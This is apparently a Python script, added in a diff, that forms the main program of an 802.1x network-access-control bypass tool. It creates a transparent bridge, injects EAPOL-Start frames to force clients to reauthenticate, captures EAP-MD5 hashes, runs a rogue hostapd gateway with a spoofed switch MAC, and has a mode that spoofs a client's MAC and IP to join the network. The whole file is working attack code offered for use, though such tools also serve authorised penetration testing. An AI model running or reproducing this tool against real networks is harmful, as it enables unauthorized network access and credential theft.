@@ -1,0 +1,313 @@
+#!/usr/bin/env python
+import os
+import time
+import json
+import sys
+
+import core.utils
+import core.firewalls
+import core.servers
+import core.analyzer
+import core.injector
+import core.core_config
+import core.cli
+
+import settings.paths
+
+from core.hostapd import Hostapd
+from core.cert_manager import cert_manager
+
+
+def cert_wizard(configs, options):
+
+    while True:
+
+        print ('[*] Please enter two letter country '
+                            'code for certs (i.e. US, FR)')
+
+        country = raw_input(': ').upper()
+        if len(country) == 2:
+            break
+        print '[!] Invalid input.'
+
+    print ('[*] Please enter state or province for '
+                        'certs (i.e. Ontario, New Jersey)')
+    state = raw_input(': ')
+
+    print '[*] Please enter locale for certs (i.e. London, Hong Kong)'
+    locale = raw_input(': ')
+
+    print '[*] Please enter organization for certs (i.e. Evil Corp)'
+    org = raw_input(': ')
+
+    print '[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)'
+    email = raw_input(': ')
+
+    print '[*] Please enter common name (CN) for certs.'
+    cn = raw_input(': ')
+
+    cert_manager.ca_cnf.configure(country, state, locale, org, email, cn)
+    cert_manager.server_cnf.configure(country, state, locale, org, email, cn)
+    cert_manager.client_cnf.configure(country, state, locale, org, email, cn)
+
+    cert_manager.bootstrap()
+
+    hostapd_conf = core.core_config.CoreConfig(settings.paths.HOSTAPD_INI, settings.paths.HOSTAPD_CONF)
+
+    hostapd_conf.update('certs', 'ca_cert', settings.paths.CA_PEM)
+    hostapd_conf.update('certs', 'server_cert', settings.paths.SERVER_PEM)
+    hostapd_conf.update('certs', 'private_key', settings.paths.PRIVATE_KEY)
+    hostapd_conf.update('certs', 'dh_file', settings.paths.DH_FILE)
+
+def create_bridge(configs, options):
+    ''' simple bridge without interaction '''
+
+    bridge_iface = options['bridge']
+    phy = options['phy']
+    upstream = options['upstream']
+    sidechannel = options['sidechannel']
+    egress_port = options['egress_port']
+    client_mac = options['client_mac']
+    switch_mac = options['switch_mac']
+
+    # preliminary cleanup
+    core.utils.misc.disable_ipv6()
+
+    # make sure we don't get locked out of our box
+    core.firewalls.iptables.default_accept()
+    core.firewalls.ebtables.default_accept()
+    core.firewalls.arptables.default_accept()
+
+    # reset firewall rules
+    core.firewalls.iptables.flush()
+    core.firewalls.ebtables.flush()
+    core.firewalls.arptables.flush()
+
+    print '[*] Creating the bridge...'
+
+    # create the bridge
+    bridge = core.utils.bridge.Bridge(bridge_iface, switch_mac)
+    bridge.create()
+    bridge.enable_8021x_forwarding()
+    bridge.enable_ip_forwarding()
+    bridge.add_iface(phy, mac=switch_mac)
+    bridge.add_iface(upstream, mac=client_mac)
+
+    print '[*] bringing both sides of the bridge up...'
+
+    # bring both sides of bridge up
+    bridge.all_ifaces_up()
+
+    print '[*] Initiate radio silence...'
+
+    # start dark - but make an exception for our side channel
+    core.firewalls.iptables.allow_outbound(sidechannel, port=egress_port)
+    core.firewalls.arptables.allow_outbound(sidechannel)
+    core.firewalls.iptables.drop_all()
+    core.firewalls.arptables.drop_all()
+
+    time.sleep(2)
+
+    print '[*] Bringing the bridge up with a non-routable IP...'
+
+    # bring the bridge up with a non-routable IP
+    bridge.up('169.254.66.66')
+
+    # go live
+    core.firewalls.arptables.allow_all()
+    core.firewalls.iptables.allow_all()
+
+def destroy_bridge(configs, options):
+
+    bridge_iface = options['bridge']
+    bridge = core.utils.bridge.Bridge(bridge_iface)
+
+    bridge.all_ifaces_down()
+    bridge.down()
+    bridge.del_all_ifaces()
+    bridge.remove()
+
+def bridge_up(configs, options):
+
+    bridge_iface = options['bridge']
+    bridge = core.utils.bridge.Bridge(bridge_iface)
+
+    bridge.all_ifaces_up()
+    bridge.up('0.0.0.0')
+
+def bridge_down(configs, options):
+
+    bridge_iface = options['bridge']
+    bridge = core.utils.bridge.Bridge(bridge_iface)
+
+    bridge.all_ifaces_down()
+    bridge.down()
+
+def ifaces_down(configs, options):
+
+    bridge_iface = options['bridge']
+    bridge = core.utils.bridge.Bridge(bridge_iface)
+
+    bridge.all_ifaces_down()
+
+def ifaces_up(configs, options):
+
+    bridge_iface = options['bridge']
+    bridge = core.utils.bridge.Bridge(bridge_iface)
+
+    bridge.all_ifaces_up()
+
+# determine eap type and steal md5 hashes
+def analyze_auth(configs, options):
+
+    bridge_iface = options['bridge']
+    client_mac = options['client_mac']
+    upstream = options['upstream']
+
+    print '[*] Starting auth analyzer...'
+    analyzer = core.analyzer.Analyzer(bridge_iface)
+    analyzer.start(5)
+
+    print '[*] Forcing %s to reathenticate by injecting EAPOL-Start packets...' % upstream
+    print '[*] Note: if injecting EAPOL-Start packets does not cause the client'
+    print '[*] to reauthenticate, then it\'s probably using MAB. Try a rogue'
+    print '[*] gateway attack to verify that the client cannot perform EAP'
+    print '[*] authentication. If it can\'t, then you should be able to'
+    print '[*] get on the network by spoofing a MAC address.'
+    core.injector.force_reauthentication(upstream, client_mac)
+
+    time.sleep(5)
+    print
+    print '[*] Analyzer is shutting down...'
+    analyzer.stop()
+    print '[*] Analyzer: job complete.'
+
+def rogue_gateway(configs, options):
+
+    # start with bridge and all slave ifaces down
+    print '[*] Bringing bridge down...'
+    try:
+        bridge_down(configs, options)
+    except OSError:
+        print '[*] No bridge found... you should probably the bridge before using this attack'
+        pass
+
+    switch_mac = options['switch_mac']
+    client_mac = options['client_mac']
+    phy = options['phy']
+
+    # phy mac address to mac address of switch
+    print '[*] Setting MAC address of PHY to match MAC address of upstream switch...'
+    os.system('macchanger -m %s %s' % (switch_mac, phy))
+
+    # configure hostapd
+    print '[*] Configuring hostapd...'
+    hostapd_conf = core.core_config.CoreConfig(settings.paths.HOSTAPD_INI, settings.paths.HOSTAPD_CONF)
+    hostapd_conf.update('cli', 'interface', phy)
+    hostapd_conf.write()
+
+    # start hostapd
+    print '[*] Starting hostapd...'
+    hostapd = Hostapd(hostapd_conf.hostapd_conf_path)
+    hostapd.start()
+
+    print '[*] Bringing PHY up in promisc mode...'
+    os.system('ifconfig %s 0.0.0.0 up promisc' % phy)
+
+    core.utils.ethtool.reset_link(phy)
+
+    # use injector to send ourselves an EAPOL-start frame, causing hostapd to sent the client
+    # an EAP-request/identity frame
+    print '[*] Sending EAP-request/identity to: %s' % client_mac
+    core.injector.force_reauthentication(phy, client_mac)
+
+    raw_input('Press any key to continue...')
+
+    print '[*] Bringing down PHY...'
+    os.system('ifconfig %s down' % phy)
+
+    print '[*] Stopping hostapd...'
+    hostapd.stop()
+
+    print '[*] Attack is stopped.'
+
+    print '[*] Bridge and all iface slaves are down.'
+    
+# also can be used if mab is enabled
+def bate_and_switch(configs, options):
+
+    client_mac = options['client_mac']
+    upstream = options['upstream']
+    netmask = options['netmask']
+    client_ip = options['client_ip']
+    wpa_supplicant_conf = options['wired_conf']
+
+    # upstream mac address to mac address of client
+    os.system('macchanger -m %s %s' % (client_mac, upstream))
+
+    # set upstream NIC client's IP address
+    os.system('ifconfig %s %s netmask %s up' % (upstream, client_ip, netmask))
+
+    # authenticate using wpa_supplicant
+    os.system('wpa_supplicant -c %s -D wired -i %s' % (wpa_supplicant_conf, upstream))
+
+def discovery(configs, options):
+
+    phy = options['phy']
+    upstream = options['upstream']
+    client_only = options['client_only']
+
+    if client_only:
+
+        os.system('ifconfig %s down' % phy)
+        os.system('ifconfig %s down' % upstream)
+        os.system('ifconfig %s 0.0.0.0 up promisc' % phy)
+
+    print '[*] The --discovery flag literally just looks at ARP packets using tcpdump.'
+    print '[*] To bail out early, hit ctrl+c. Feel free to use tcpdump to sniff for other'
+    print '[*] types of packets using tcpdump. Just make sure to sniff on your PHY interface.'
+    os.system('tcpdump -i %s -s0 -w ./tmp/pcap.pcap -c50 arp' % phy)
+
+    os.system("tcpdump -r ./tmp/pcap.pcap -nne | grep 'is-at'")
+
+    if client_only:
+
+        os.system('ifconfig %s down' % phy)
+
+if __name__ == '__main__':
+
+    print core.utils.banner.randz0rzlulz()
+
+    options = core.cli.options()
+
+    if options['debug']:
+        print json.dumps(options, indent=4, sort_keys=True)
+
+    core_conf = core.core_config.CoreConfig(settings.paths.CORE_INI, settings.paths.CORE_CONF)
+
+    if options['debug']:
+        for i in core_conf.items():
+            print json.dumps(i, indent=4, sort_keys=True)
+
+    if options['create_bridge']:
+        create_bridge(core_conf, options)
+    elif options['destroy_bridge']:
+        destroy_bridge(core_conf, options)
+    elif options['bridge_down']:
+        bridge_down(core_conf, options)
+    elif options['bridge_up']:
+        bridge_up(core_conf, options)
+    elif options['ifaces_down']:
+        ifaces_down(core_conf, options)
+    elif options['ifaces_up']:
+        ifaces_up(core_conf, options)
+    elif options['rogue_gateway']:
+        rogue_gateway(core_conf, options)
+    elif options['bate_n_switch']:
+        bate_and_switch(core_conf, options)
+    elif options['analyze_auth']:
+        analyze_auth(core_conf, options)
+    elif options['cert_wizard']:
+        cert_wizard(core_conf, options)
+    elif options['discovery']:
+        discovery(core_conf, options)
